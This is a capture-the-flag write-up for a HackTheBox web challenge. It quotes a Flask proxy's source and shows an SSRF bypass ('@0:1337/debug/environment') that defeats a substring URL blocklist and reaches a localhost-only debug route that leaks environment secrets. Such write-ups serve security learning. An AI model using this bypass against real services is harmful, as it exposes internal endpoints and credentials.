# Proxy as a Service HTB Challenge 

__________________________________________

From The source code it'll be very clear where is the vulnerability and what we have to do to exploit:
#### util.py
In this script we can see the restricted urls and the "is_from_localhost" function we need to bypass
```python
from flask import request, abort
import functools, requests

RESTRICTED_URLS = ['localhost', '127.', '192.168.', '10.', '172.']

def is_safe_url(url):
    for restricted_url in RESTRICTED_URLS:
        if restricted_url in url:
            return False
    return True

def is_from_localhost(func):
    @functools.wraps(func)
    def check_ip(*args, **kwargs):
        if request.remote_addr != '127.0.0.1':
            return abort(403)
        return func(*args, **kwargs)
    return check_ip

def proxy_req(url):    
    method = request.method
    headers =  {
        key: value for key, value in request.headers if key.lower() in ['x-csrf-token', 'cookie', 'referer']
    }
    data = request.get_data()

    response = requests.request(
        method,
        url,
        headers=headers,
        data=data,
        verify=False
    )

    if not is_safe_url(url) or not is_safe_url(response.url):
        return abort(403)
    
    return response, headers
```
#### Dockerfile
In dockerfile we can understand we need to get to the /environment to get the flag.
```
....
# Place flag in environ
ENV FLAG=HTB{f4k3_fl4g_f0r_t3st1ng}

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]

```

#### routes.py

The endpoint to reach is /debug/environment and we will do it from the "url" parameter.
```python
from flask import Blueprint, request, Response, jsonify, redirect, url_for
from application.util import is_from_localhost, proxy_req
import random, os

SITE_NAME = 'reddit.com'

proxy_api = Blueprint('proxy_api', __name__)
debug     = Blueprint('debug', __name__)

@proxy_api.route('/', methods=['GET', 'POST'])
def proxy():
    url = request.args.get('url')

    if not url:
        cat_meme_subreddits = [
            '/r/cats/',
            '/r/catpictures',
            '/r/catvideos/'
        ]

        random_subreddit = random.choice(cat_meme_subreddits)

        return redirect(url_for('.proxy', url=random_subreddit))
    
    target_url = f'http://{SITE_NAME}{url}'
    response, headers = proxy_req(target_url)

    return Response(response.content, response.status_code, headers.items())

@debug.route('/environment', methods=['GET'])
@is_from_localhost
def debug_environment():
    environment_info = {
        'Environment variables': dict(os.environ),
        'Request headers': dict(request.headers)
    }

    return jsonify(environment_info)
```
## Bypass

If we go tu http://127.0.0.1:1337/?url=/ we will be redirect to a reddit page and whatever we look for after the "/", it's always going to reddit!

After trying different bypasses method i found that `?url=@0:1337/debug/environment`
- **@** bypass the redirection
- **0:1337** bypass the "RESTRICTED_URLS" restriction

Do You Want the flag?
Go to:
```
http://127.0.0.1:1337/?url=@0:1337/debug/environment
```

